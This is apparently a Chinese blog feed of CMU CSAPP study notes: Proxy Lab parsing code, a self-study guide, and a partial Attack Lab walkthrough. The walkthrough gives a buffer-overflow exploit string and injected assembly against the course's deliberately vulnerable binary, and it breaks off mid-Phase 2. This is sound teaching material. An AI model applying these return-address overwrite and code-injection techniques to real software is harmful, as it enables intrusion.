punctuation">[</span>pos<span class="token operator">-</span>buf<span class="token operator">+</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token string">"HTTP/1.1"</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token char">'0'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">parseLine</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> buf<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> host<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> port<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> method<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> uri<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> <span class="token keyword">version</span><span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> filename<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">sscanf</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token string">"%s %s %s"</span><span class="token punctuation">,</span>method<span class="token punctuation">,</span>uri<span class="token punctuation">,</span><span class="token keyword">version</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//method = "GET", uri = "http://localhost:15213/home.html", version = "HTTP1.0"</span>    <span class="token keyword">char</span><span class="token operator">*</span> hostp <span class="token operator">=</span> <span class="token function">strstr</span><span class="token punctuation">(</span>uri<span class="token punctuation">,</span> WEB_PREFIX<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">strlen</span><span class="token punctuation">(</span>WEB_PREFIX<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">char</span><span class="token operator">*</span> slash <span class="token operator">=</span> <span class="token function">strstr</span><span class="token punctuation">(</span>hostp<span class="token punctuation">,</span> <span class="token string">"/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">char</span><span class="token operator">*</span> colon <span class="token operator">=</span> <span class="token function">strstr</span><span class="token punctuation">(</span>hostp<span class="token punctuation">,</span> <span class="token string">":"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//get host name</span>    <span class="token function">strncpy</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> hostp<span class="token punctuation">,</span> slash <span class="token operator">-</span> hostp<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">//get port number</span>    <span class="token function">strncpy</span><span class="token punctuation">(</span>port<span class="token punctuation">,</span> colon <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> slash <span class="token operator">-</span> colon <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//get file name</span>    <span class="token function">strcpy</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> slash<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">/*    host : localhost:15214    filename: /home.html    */</span><span class="token punctuation">&#125;</span><span class="token comment">// html headers and response body</span><span class="token keyword">void</span> <span class="token function">Clienterror</span><span class="token punctuation">(</span><span class="token keyword">int</span> fd<span class="token punctuation">,</span><span class="token keyword">char</span> <span class="token operator">*</span>cause<span class="token punctuation">,</span><span class="token keyword">char</span> <span class="token operator">*</span>errnum<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>shortmsg<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>longmsg<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">char</span> buf<span class="token punctuation">[</span>MAXLINE<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">/* Print the HTTP response headers */</span>    <span class="token function">sprintf</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token string">"HTTP/1.0 %s %s\r\n"</span><span class="token punctuation">,</span> errnum<span class="token punctuation">,</span> shortmsg<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">Rio_writen</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">sprintf</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token string">"Content-type: text/html\r\n\r\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">Rio_writen</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">/* Print the HTTP response body */</span>    <span class="token function">sprintf</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token string">"&lt;html>&lt;title>Tiny Error&lt;/title>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">Rio_writen</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">sprintf</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token string">"&lt;body bgcolor="</span><span class="token string">"ffffff"</span><span class="token string">">\r\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">Rio_writen</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">sprintf</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token string">"%s: %s\r\n"</span><span class="token punctuation">,</span> errnum<span class="token punctuation">,</span> shortmsg<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">Rio_writen</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">sprintf</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token string">"&lt;p>%s: %s\r\n"</span><span class="token punctuation">,</span> longmsg<span class="token punctuation">,</span> cause<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">Rio_writen</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">sprintf</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token string">"&lt;hr>&lt;em>The Tiny Web server&lt;/em>\r\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">Rio_writen</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202408180455756.png" alt="image-20240818045547484"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这是一场旷日持久的斗争！</p><p>但是我学到了很多！</p><p>感谢CMU 15-213 CSAPP!</p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
            <tag> CSAPP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSAPP自学指北</title>
      <link href="/2024/02/27/lab0/"/>
      <url>/2024/02/27/lab0/</url>
      
        <content type="html"><![CDATA[<blockquote><p>Csapp真心不好学</p></blockquote><h1 id="总体原则"><a href="#总体原则" class="headerlink" title="总体原则"></a>总体原则</h1><p>尽量做完所有的exercise,做了一部分,感觉出的不错</p><p>看书前沐浴更香,保持心静(逃)</p><h1 id="链接推荐"><a href="#链接推荐" class="headerlink" title="链接推荐"></a>链接推荐</h1><h2 id="计算机科学速成课"><a href="#计算机科学速成课" class="headerlink" title="计算机科学速成课"></a><a href="https://www.bilibili.com/video/BV1EW411u7th">计算机科学速成课</a></h2><p> 推荐大家在正式学习前花一点时间看完这个,只需要一点点时间,就能够对计算机有一个较为全面的认识</p><h2 id="CSAPP导读"><a href="#CSAPP导读" class="headerlink" title="CSAPP导读"></a><a href="https://fengmuzi2003.gitbook.io/csapp3e/">CSAPP导读</a></h2><p>我主要是以这个为索引阅读的,主要是光啃书真的太困难了,我的bomblab就是光啃书做的,痛苦死了</p><h2 id="中英精校字幕课程"><a href="#中英精校字幕课程" class="headerlink" title="中英精校字幕课程"></a><a href="https://www.bilibili.com/video/BV1iW411d7hd">中英精校字幕课程</a></h2><p>这个课程除了没有助教的补充说明(这个在Csapp导读里面有链接),其余部分还是很不错的,字幕完整精确(要注意，字幕是由作者谷歌机翻再手动改一点的，所以有些地方可能不是人话)</p><h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><p>[[CSAPP环境配置]]</p><h1 id="实验资料"><a href="#实验资料" class="headerlink" title="实验资料"></a>实验资料</h1><p>这里包含目前(2021.07.02)所有的CSAPP实验文件，一共11个，其中有3个实验是同一实验的不同版本，所以真正需要做的就是8个实验。</p><p>以下是CMU官网对于各个实验的介绍：</p><h2 id="1-Data-Lab"><a href="#1-Data-Lab" class="headerlink" title="1. Data Lab"></a>1. Data Lab</h2><p>该实验让学生们在一个使用C语言的高度限制的子集中对无符号整数、补码整数和浮点数进行一些操作。 例如，他们可能会被要求只能使用位级运算和顺序控制代码来计算一个数字的绝对值。 这个实验通过让学生们操作各种二进制的位级行为，来帮助理解C数据类型的位级表示。<br>[[lab1_datalab]]</p><h2 id="2-Bomb-Lab"><a href="#2-Bomb-Lab" class="headerlink" title="2. Bomb Lab"></a>2. Bomb Lab</h2><p>“二进制炸弹”是向学生们提供操作的可执行文件。 当该程序运行时，它会逐个提示用户输入总共6个不同的字符串。如果其中任何一个是不正确的，则炸弹就会“爆炸”，在界面上打印错误消息并在计分系统上记录该次错误。 学生们必须通过反汇编以及逆向工程来“拆除”自己所独有的炸弹，以确定这6个字符串应该是什么。 该实验将会让学生们去理解什么是汇编语言，并迫使他们去学习如何使用调试器。该实验非常有趣，且这个实验也是CMU本科中的一个传奇实验。</p><p>我们所提供的二进制炸弹是一个Linux&#x2F;x86-64的可执行文件，你可以自己尝试运行一下。现在，计分系统已禁用，因此可以随意引爆此炸弹而不会受到惩罚。<br>[[lab2_bomblab]]</p><h2 id="3-Attack-Lab"><a href="#3-Attack-Lab" class="headerlink" title="3. Attack Lab"></a>3. Attack Lab</h2><p>注意：这个实验是Buffer Lab(IA32)的64位改进版本。</p><p>我们提供了学生们一对独特的X86-64的二进制可执行文件，这对文件也被称为攻击目标，它们都具有缓冲区溢出漏洞。它们中的一个容易受到代码注入(CI)攻击；而另一个容易受到面向返回编程(ROP)攻击。 我们要求学生通过基于CI或者ROP来修改攻击目标的一些行为。此实验会让学生们了解一些堆栈的使用规则，并指导他们编写出能够防范缓冲区溢出攻击的代码。<br>[[lab3_attacklab]]</p><h2 id="4-Architecture-Lab"><a href="#4-Architecture-Lab" class="headerlink" title="4. Architecture Lab"></a>4. Architecture Lab</h2><p>注意：该实验是Architecture Lab(Y86)的64位改进版本。</p><p>给学生们一个基于Y86-64处理器的数组复制函数和一个流水线架构的Y86-64处理器，用于计算复制每个元素所需要的时钟周期(CPE)。学生们需要通过修改该函数的实现和Y86-64处理器的设计来使该函数的CPE最小化。该实验能够让学生对于硬件与软件的交互有一个深刻的理解。</p><p>提示：本次实验的材料包括Y86-64处理器模拟器的发行源码和Y86-64模拟器的指南。<br>[[lab4_archlab]]</p><h2 id="5-Cache-Lab"><a href="#5-Cache-Lab" class="headerlink" title="5. Cache Lab"></a>5. Cache Lab</h2><p>注意：该实验是Performance Lab的64位改进版本。</p><p>学生需要编写一个通用的高速缓存模拟器，然后再优化一个矩阵转置算法，使其在高速缓存中的未命中次数最小。 该实验使用Valgrind工具来生成内存操作记录。</p><p>注意：此实验必须在X86-64系统上才能运行。<br>[[lab5_cachelab]]</p><h2 id="6-Shell-Lab"><a href="#6-Shell-Lab" class="headerlink" title="6. Shell Lab"></a>6. Shell Lab</h2><p>这次实验让学生们实现自己的一个简单Unix Shell程序，该程序包括作业控制、ctrl-c和ctrl-z击键控制、fg、bg和jobs指令。 这次是第一次对学生们引入应用级并发的概念，这些让他们对Unix的进程控制和信号处理方面有了一个清晰的认识。<br>[[lab6_shlab]]</p><h2 id="7-Malloc-Lab"><a href="#7-Malloc-Lab" class="headerlink" title="7. Malloc Lab"></a>7. Malloc Lab</h2><p>本次实验让学生们实现他们自己版本的<code>malloc</code>、<code>free</code>和<code>realloc</code>函数。 该实验让学生清楚地理解了数据的布局和组织，并要求他们对于空间和时间效率之间进行权衡和折中。 这个实验是我们最喜欢的实验之一，当学生们完成这个实验时，他们真正的理解了指针的含义！<br>[[lab7_malloclab]]</p><h2 id="8-Proxy-Lab"><a href="#8-Proxy-Lab" class="headerlink" title="8. Proxy Lab"></a>8. Proxy Lab</h2><p>实现一个位于浏览器和万维网其他部分之间的并行Web代理。这个实验向学生们揭示了Web客户端和服务器这样的主题，并且把课程中的许多概念联系起来，比如字节排序、文件IO、进程控制、信号、信号处理、内存映射、套接字和并发。学生很高兴能够看到他们的程序在真实的Web浏览器和Web服务器之间起到的作用。<br>[[lab8_proxylab]]</p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
            <tag> CSAPP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSAPP的lab3-attacklab</title>
      <link href="/2024/02/27/lab3/"/>
      <url>/2024/02/27/lab3/</url>
      
        <content type="html"><![CDATA[<blockquote><p>一个寒假没动,开学了,努努力把Attack Lab开盒了</p></blockquote><h1 id="Part-I-CI"><a href="#Part-I-CI" class="headerlink" title="Part I CI"></a>Part I CI</h1><h2 id="总览"><a href="#总览" class="headerlink" title="总览"></a>总览</h2><blockquote><p>CI: Code Injection Attacks</p></blockquote><p>测试下这个程序</p><p>注意我们在执行ctarget程序的时候默认是连接到cmu的服务器，但是我们不是cmu的学生所以连不上服务器也就无法执行代码，所以执行的时候要加命令行参数 -q 以阻止连接到服务器的行为。</p><p>输入以下命令运行ctarget</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token punctuation">.</span><span class="token operator">/</span>ctarget <span class="token operator">-</span>q<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>(同理,用gdb ctarget时,要注意run要写成run -q,不然就会试图链接远程服务器,然后报以下错误)</p><p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402291454046.png" alt="image-20240229000718171"></p><p>随意的输入个string得知程序大致运行方式</p><p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402291454085.png" alt="image-20240229000829319"></p><h2 id="Phase-1"><a href="#Phase-1" class="headerlink" title="Phase_1"></a>Phase_1</h2><p>然后我们在做实验之前一定要看的pdf文档告诉我们以下信息<br>For Phase 1, you will not inject new code. Instead, your exploit string will redirect the program to execute<br>an existing procedure.<br>Function getbuf is called within CTARGET by a function test having the following C code:</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> val<span class="token punctuation">;</span>    val <span class="token operator">=</span> <span class="token function">getbuf</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"No exploit. Getbuf returned 0x%x\n"</span><span class="token punctuation">,</span> val<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>When getbuf executes its return statement (line 5 of getbuf), the program ordinarily resumes execution<br>within function test (at line 5 of this function). We want to change this behavior. Within the file ctarget,<br>there is code for a function touch1 having the following C representation:</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">touch1</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    vlevel <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Touch!: You called touch1()\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">validate</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Your task is to get CTARGET to execute the code for touch1 when getbuf executes its return statement,<br>rather than returning to test. Note that your exploit string may also corrupt parts of the stack not directly<br>related to this stage, but this will not cause a problem, since touch1 causes the program to exit directly.<br>Some Advice:<br>• All the information you need to devise your exploit string for this level can be determined by exam-<br>ining a disassembled version of CTARGET. Use objdump -d to get this dissembled version.<br>• The idea is to position a byte representation of the starting address for touch1 so that the ret<br>instruction at the end of the code for getbuf will transfer control to touch1.<br>• Be careful about byte ordering.<br>• You might want to use GDB to step the program through the last few instructions of getbuf to make<br>sure it is doing the right thing.<br>• The placement of buf within the stack frame for getbuf depends on the value of compile-time<br>constant BUFFER_SIZE, as well the allocation strategy used by GCC. You will need to examine the<br>disassembled code to determine its position.</p><p>所以我们要把touch1的函数位置来覆盖getbuf的返回值以便执行touch1</p><p>先输入查看汇编代码</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">objdump <span class="token parameter variable">-d</span> ctarget <span class="token operator">></span>ctarget.s<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Getbuf:</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">00000000004017a8 &lt;getbuf&gt;:  4017a8:48 83 ec 28          sub    $0x28,%rsp;  4017ac:48 89 e7             mov    %rsp,%rdi  4017af:e8 8c 02 00 00       callq  401a40 &lt;Gets&gt;  4017b4:b8 01 00 00 00       mov    $0x1,%eax  4017b9:48 83 c4 28          add    $0x28,%rsp  4017bd:c3                   retq     4017be:90                   nop  4017bf:90                   nop<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Touch1:</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">00000000004017c0 &lt;touch1&gt;:  4017c0:48 83 ec 08          sub    $0x8,%rsp  4017c4:c7 05 0e 2d 20 00 01 movl   $0x1,0x202d0e(%rip)        # 6044dc &lt;vlevel&gt;  4017cb:00 00 00   4017ce:bf c5 30 40 00       mov    $0x4030c5,%edi  4017d3:e8 e8 f4 ff ff       callq  400cc0 &lt;puts@plt&gt;  4017d8:bf 01 00 00 00       mov    $0x1,%edi  4017dd:e8 ab 04 00 00       callq  401c8d &lt;validate&gt;  4017e2:bf 00 00 00 00       mov    $0x0,%edi  4017e7:e8 54 f6 ff ff       callq  400e40 &lt;exit@plt&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>0x28在十进制下2*16+8&#x3D;40个bytes,一个地址是8个bytes,所以我们想要在getbuf时跳转到touch1则需要缓冲区把原本的地址的位置(0x5561dca8)覆盖成0x004017c0,而那空余的四十个bytes想填啥填啥</p><p>即字节码为:(小端法,逆序存储)</p><pre class="line-numbers language-none"><code class="language-none">00 00 00 0000 00 00 0000 00 00 0000 00 00 0000 00 00 0000 00 00 0000 00 00 0000 00 00 0000 00 00 0000 00 00 00c0 17 40 00<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>保存该文件为sol1.txt,然后把这个字节码转化成string,通过hex2raw命令(可以查看pdf文档的附录A),然后可以通过-i进行重定向输入,则完成Phase_1</p><p>输入命令</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./hex2raw <span class="token operator">&lt;</span>sol1.txt <span class="token operator">></span>sol1r.txtgdb ctargetrun <span class="token parameter variable">-q</span> <span class="token parameter variable">-i</span> sol1r.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>观察到以下信息则通关!</p><p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403020220621.png" alt="image-20240302013522137"></p><h2 id="Phase-2"><a href="#Phase-2" class="headerlink" title="Phase_2"></a>Phase_2</h2><p>照例读一遍官方pdf文档:</p><p>Phase 2 involves injecting a small amount of code as part of your exploit string. Within the file ctarget there is code for a function <strong>touch2</strong> having the following C representation:</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">touch2</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> val<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>vlevel <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span><span class="token comment">/* Part of validation protocol */</span><span class="token keyword">if</span> <span class="token punctuation">(</span>val <span class="token operator">==</span> cookie<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Touch2!: You called touch2(0x%.8x)\n"</span><span class="token punctuation">,</span> val<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">validate</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Misfire: You called touch2(0x%.8x)\n"</span><span class="token punctuation">,</span> val<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fail</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Your task is to get CTARGET to execute the code for touch2 rather than returning to test. In this case,however, you must make it appear to touch2 as if you have passed your cookie as its argument.<code>你的任务是让CTARGET执行touch2的代码，而不是返回测试。但是，在这种情况下，您必须使它看起来像touch2一样，就像您已将cookie作为其参数传递一样。</code></p><p>Some Advice:<br>• You will want to position a byte representation of the address of your injected code in such a way that ret instruction at the end of the code for getbuf will transfer control to it.<code>您将希望以这样一种方式定位注入代码的地址的字节表示形式，即getbuf代码末尾的ret指令将控制权转移给它。</code><br>• Recall that the first argument to a function is passed in register %rdi.<code>回想一下，函数的第一个参数是在寄存器 % rdi中传递的。</code><br>• Your injected code should set the register to your cookie, and then use a ret instruction to transfer control to the first instruction in touch2.<code>您注入的代码应将寄存器设置为您的cookie，然后使用ret指令将控制权转移到touch2中的第一个指令。</code><br>• Do not attempt to use jmp or call instructions in your exploit code. The encodings of destination addresses for these instructions are difficult to formulate. Use ret instructions for all transfers of control, even when you are not returning from a call.<code>不要尝试在漏洞利用代码中使用jmp或调用指令。这些指令的目的地地址的编码难以公式化。对所有控制权转移使用ret指令，即使您没有从呼叫中返回。</code><br>• See the discussion in Appendix B on how to use tools to generate the byte-level representations of instruction sequence<code>请参阅附录b中有关如何使用工具生成指令序列的字节级表示的讨论</code></p><p>touch2</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">00000000004017ec &lt;touch2&gt;:  4017ec:48 83 ec 08          sub    $0x8,%rsp  4017f0:89 fa                mov    %edi,%edx  4017f2:c7 05 e0 2c 20 00 02 movl   $0x2,0x202ce0(%rip)        # 6044dc &lt;vlevel&gt;  4017f9:00 00 00   4017fc:3b 3d e2 2c 20 00    cmp    0x202ce2(%rip),%edi        # 6044e4 &lt;cookie&gt;  401802:75 20                jne    401824 &lt;touch2+0x38&gt;  401804:be e8 30 40 00       mov    $0x4030e8,%esi  401809:bf 01 00 00 00       mov    $0x1,%edi  40180e:b8 00 00 00 00       mov    $0x0,%eax  401813:e8 d8 f5 ff ff       callq  400df0 &lt;__printf_chk@plt&gt;  401818:bf 02 00 00 00       mov    $0x2,%edi  40181d:e8 6b 04 00 00       callq  401c8d &lt;validate&gt;  401822:eb 1e                jmp    401842 &lt;touch2+0x56&gt;  401824:be 10 31 40 00       mov    $0x403110,%esi  401829:bf 01 00 00 00       mov    $0x1,%edi  40182e:b8 00 00 00 00       mov    $0x0,%eax  401833:e8 b8 f5 ff ff       callq  400df0 &lt;__printf_chk@plt&gt;  401838:bf 02 00 00 00       mov    $0x2,%edi  40183d:e8 0d 05 00 00       callq  401d4f &lt;fail&gt;  401842:bf 00 00 00 00       mov    $0x0,%edi  401847:e8 f4 f5 ff ff       callq  400e40 &lt;exit@plt&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>所以我要做的应该是把%rdi中的值变成cookie的值,这样在比较时便会通过.</p><p>知识扫盲:汇编语言中的ret指令是call指令的逆操作，它表示从子程序中返回到主程序。执行ret指令时，CPU会从堆栈中弹出上一个储存的PC值，并将其加载到PC寄存器中，程序就回到了主程序中继续执行。这时%rsp不会变化(如果没有其它命令的话)</p><p>需完成操作:</p><ul><li><p>将cookie(0x59b997fa中的值推送到%rdi中</p></li><li><p>将touch2的地址push到栈中</p></li><li><p>ret,取到touch2的地址</p></li></ul><p>根据以上操作写出汇编代码,保存该代码为t2.s文件</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">mov $0x59b997fa, %rdipushq $0x4017ecret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>接下来我们要得到机器代码(编译再反汇编得到机器代码指令)</p><p>输入以下指令</p><pre class="line-numbers language-none"><code class="language-none">gcc -c -Og t2.sobjdump -d t2.o&gt;t2.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>可以得到汇编代码的机器指令:</p><p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403020220772.png" 